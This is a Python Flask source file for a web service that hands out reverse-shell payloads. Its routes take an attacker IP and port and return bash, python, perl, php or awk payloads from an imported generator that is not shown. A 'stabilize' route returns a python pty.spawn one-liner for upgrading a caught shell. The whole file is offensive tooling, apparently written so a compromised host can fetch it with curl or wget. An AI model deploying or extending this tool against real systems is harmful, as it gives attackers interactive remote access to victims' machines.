from flask import render_template, Blueprint, request
from .validate_and_generate import payload_generator, valid_ip, valid_port

# Returns payload.
def ret_payload(ip, port, lang, quotes_pref, shell_pref):
	if valid_ip(ip) == True and valid_port(port) == True:
		return payload_generator(ip, port, lang, quotes_pref, shell_pref, False)
	else:
		return "Invalid IP or Port"

# Main index blueprint / route.
index = Blueprint("index", __name__)
@index.route('', methods=['GET'])
def home():
	return render_template('index.html')

# Help page.
@index.route('help', methods=['GET'])
def help():
	# If curl or wget return help.txt instead of html help page.
	if ("curl" in request.headers.get('User-Agent') or 
		"Wget" in request.headers.get('User-Agent')):
		return render_template('help.txt')
	return render_template('help.html')

# Stabilize shell.
@index.route('stabilize', methods=['GET'])
@index.route('reset', methods=['GET'])
def stabilize():
	py_stabilise_payload = 'pty=__import__(\"pty\");pty.spawn("/bin/bash")'
	return f"python -c '{py_stabilise_payload}'\n"

# Bash route.
@index.route('<string:ip>/<int:port>', methods=['GET'])
@index.route('bash/<string:ip>/<int:port>', methods=['GET'])
def bash(ip, port):
	quotes_pref = request.args.get("q", str)
	shell_pref = request.args.get("s", str)
	return ret_payload(ip, port, "bash", quotes_pref, shell_pref)

# Python route.
@index.route('python/<string:ip>/<int:port>', methods=['GET'])
@index.route('python3/<string:ip>/<int:port>', methods=['GET'])
def python(ip, port):
	quotes_pref = request.args.get("q", str)
	shell_pref = request.args.get("s", str)
	return ret_payload(ip, port, "python", quotes_pref, shell_pref)

# Perl route.
@index.route('perl/<string:ip>/<int:port>', methods=['GET'])
def perl(ip, port):
	quotes_pref = request.args.get("q", str)
	shell_pref = request.args.get("s", str)
	return ret_payload(ip, port, "perl", quotes_pref, shell_pref)

# PHP route.
@index.route('php/<string:ip>/<int:port>', methods=['GET'])
def php(ip, port):
	quotes_pref = request.args.get("q", str)
	shell_pref = request.args.get("s", str)
	return ret_payload(ip, port, "php", quotes_pref, shell_pref)

# Awk route.
@index.route('awk/<string:ip>/<int:port>', methods=['GET'])
def awk(ip, port):
	quotes_pref = request.args.get("q", str)
	shell_pref = request.args.get("s", str)
	return ret_payload(ip, port, "awk", quotes_pref, shell_pref)
